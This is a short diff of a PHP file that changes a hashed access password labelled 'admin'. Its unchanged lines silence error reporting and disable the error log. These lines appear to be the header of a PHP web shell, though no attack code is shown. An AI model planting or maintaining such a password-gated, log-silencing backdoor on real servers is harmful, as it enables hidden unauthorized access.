@@ -1,5 +1,5 @@
 <?php
-$Pass = "bd099eb9022f90fc3d0f0dd2d27595fa"; //admin
+$Pass = "0fb0b8102bcde0e5c2936819efa13db0"; //admin
 @error_reporting(0);
 @error_reporting(E_ALL ^ E_NOTICE);
 @ini_set("error_log", null);
